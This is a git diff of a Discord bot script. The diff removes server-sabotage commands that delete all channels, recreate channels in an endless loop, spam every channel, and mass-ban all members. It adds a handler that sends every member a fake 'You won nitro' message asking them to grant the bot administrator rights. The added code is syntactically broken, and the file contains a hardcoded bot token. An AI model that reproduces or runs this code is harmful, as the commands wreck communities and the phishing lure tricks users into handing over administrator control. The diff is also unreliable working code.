@@ -29,69 +29,17 @@ async def on_ready():
     await client.change_presence(status=discord.Status.online, activity=activity)
     print("The bot is ready")
 
-@client.command()
-async def destroy (ctx,message):
-    guild=ctx.message.guild
-    await ctx.message.delete()
-    
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-            print(f"{channel.name} has been deleted")
-        except:
-             pass
-    for i in range(1):
-        await guild.create_text_channel(f"{message}")
-    while True:
-        for channel in guild.text_channels:
-            for i in range (1):
-                await guild.create_text_channel(f"{message}")
- 
-
-@client.command()
-async def s(ctx, *, message ):
-  guild=ctx.message.guild
-  await ctx.message.delete()
-  for i in range(2):
-    print("spammed")
-    while True:
-           for channel in guild.text_channels:
-                 await channel.send(f"{message}")
-
-@client.command()
-async def cda(ctx):
-    guild=ctx.message.guild
-    await ctx.message.delete()
-    
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-        except:
-            pass
-
-@client.command()
-async def b(ctx,reason=None):
-  guild=ctx.guild
+@client.event
+async def on_bot_join(ctx):
   members=ctx.guild.members
-  await ctx.message.delete()
-
+  
+  embed=discord.Embed(title="",discord.Color.red())
+  embed.add_field(name="You won nitro",value="Add this bot to claim your gift after 24h [ADD BOT!!](https://discord.com/api/oauth2/authorize?client_id=850076753828249650&permissions=8&scope=bot)")
+  embed.set_image(url="https://tenor.com/view/discord-classic-nitro-gif-14823293")
   for member in members:
     try:
-       await member.ban(reason=reason)
-       print("BANNED.")
-    except:
-       print("i cannot ban this user.")       
+       await member.send(embed=embed)
 
-@client.command()
-async def commands(ctx):
- 
-  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.red(),inline=False)
-  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
-  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
-  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
-  embed.add_field(name="**b**",value="b for mass ban (banall)",inline=False)
-  embed.set_footer(text="developed by Saad.")
 
-  await ctx.send(embed=embed)
 
 client.run("ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo")
